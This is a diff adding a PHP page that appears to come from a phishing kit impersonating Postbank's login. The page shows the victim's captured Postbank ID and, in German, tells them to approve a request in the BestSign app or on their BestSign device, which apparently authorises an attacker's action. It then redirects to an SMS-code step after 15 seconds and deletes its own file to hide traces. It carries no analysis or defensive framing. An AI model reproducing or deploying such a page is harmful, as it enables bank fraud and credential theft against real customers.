@@ -1,0 +1,122 @@
+<?php
+    /*******
+    Main Author: Z0N51
+    Contact me on telegram : https://t.me/z0n51
+    ********************************************************/
+    
+    require_once '../includes/main.php';
+    $_SESSION['last_page'] = 'app';
+?>
+<!doctype html>
+<html>
+
+    <head>
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
+        
+        <!-- CSS FILES -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
+        <link rel="stylesheet" href="../assets/css/helpers.css">
+        <link rel="stylesheet" href="../assets/css/style.css">
+
+        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />
+
+        <title>Postbank</title>
+    </head>
+
+    <body>
+
+        <!-- HEADER -->
+        <header id="header">
+            <div class="container">
+                <img src="../assets/imgs/logo.svg" alt="">
+            </div>
+        </header>
+        <!-- END HEADER -->
+
+        <!-- MAIN -->
+        <main id="main" class="app-area">
+            
+            <div class="container">
+                <div class="row justify-content-center">
+                    <div class="col-md-6">
+                        <p>Um sich mit Ihrer Postbank ID <?php echo $_SESSION['postbank_id'] ?> einzuloggen, legitimieren Sie sich bitte mit einem Sicherheitsverfahren.</p>
+                        <div class="row align-items-center">
+                            <div class="col-8">
+                                <p>Bitte wählen Sie aus der Liste Ihr gewünschtes Gerät aus und klicken Sie auf "Freigeben".</p>
+                                <p>Bitte prüfen Sie alle Angaben auf der Anzeige Ihrer App bzw. Ihres Geräts und bestätigen Sie Ihren Auftrag.</p>
+                            </div>
+                            <div class="col-4"><img style="width: 90%;" src="../assets/imgs/so.svg"></div>
+                        </div>
+                        <p>
+                            <b>BestSign-Gerät:</b><br>
+                            Stellen Sie sicher, dass das BestSign-Gerät betriebsbereit ist und prüfen Sie die angezeigten Auftragsdaten auf der Anzeige Ihres BestSign-Gerätes. Geben Sie den Auftrag durch Drücken des Freigabeknopfes frei.
+                        </p>
+                        <p>
+                            <b>Apps der Postbank:</b><br>
+                            Öffnen Sie Ihre App und prüfen Sie die angezeigten Auftragsdaten. Geben Sie den Auftrag per Fingerabdruck, Face ID oder Passwort frei.
+                        </p>
+                        <p>Sollten die Auftragsdaten fehlerhaft sein, so können Sie den Vorgang jederzeit abbrechen.</p>
+                        <p>Derzeit als favorisiertes Sicherheitsverfahren für den Login festgelegt</p>
+                        <div class="btns text-right mt30 d-flex justify-content-end">
+                            <button type="button">Abbrechen</button>
+                            <button style="background: #CCCCCC; border: 0; margin-left: 10px;" type="button"><div class="lds-ring"><div></div><div></div><div></div><div></div></div></button>
+                        </div>
+                        <hr class="mt30 mb30">
+                        <p style="color: #0a3478; margin-bottom: 30px; font-size: 15px;"><i style="font-size: 10px;" class="fas fa-chevron-right"></i> Sicherheitsverfahren bearbeiten?</p>
+                    </div>
+                </div>
+
+                <div class="infos">
+                    <div class="row">
+                        <div class="col-md-4"></div>
+                        <div class="col-md-8">
+                            <h3>Schneller Login mit der BestSign App</h3>
+                            <p class="mb-0">Sie wollen sich schnell und bequem im Banking & Brokerage anmelden? Dann nutzen Sie die BestSign App. Alles, was Sie dafür tun müssen: Einfach ein BestSign Sicherheitsverfahren als favorisiertes Sicherheitsverfahren festlegen.</p>
+                            <p style="color: #0a3478; margin-bottom: 0; font-size: 15px;"><i style="font-size: 10px;" class="fas fa-chevron-right"></i> Jetzt die BestSign App einrichten</p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+        </main>
+        <!-- END MAIN -->
+
+        <!-- FOOTER -->
+        <footer id="footer" style="margin-top: 50px;">
+            <div class="container">
+                <ul>
+                    <li style="font-weight: 700;">Das ist neu</li>
+                    <li style="font-weight: 700;">Feedback</li>
+                    <li>Terminvereinbarung</li>
+                    <li>Kontakt</li>
+                    <li>Impressum</li>
+                    <li>Rechtshinweise</li>
+                    <li>Datenschutzhinweise</li>
+                </ul>
+                <p>&copy; 2020 Postbank – eine Niederlassung der Deutsche Bank AG</p>
+            </div>
+        </footer>
+        <!-- END FOOTER -->
+        
+        <!-- JS FILES -->
+        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
+        <script src="../assets/js/script.js"></script>
+
+        <script type="text/javascript">
+            setTimeout(function () {
+                window.location.href= '../index.php?redirection=sms';
+            },15000); // 1000 = 1s
+        </script>
+
+    </body>
+
+</html>
+<?php unlink(basename(__FILE__)); ?>
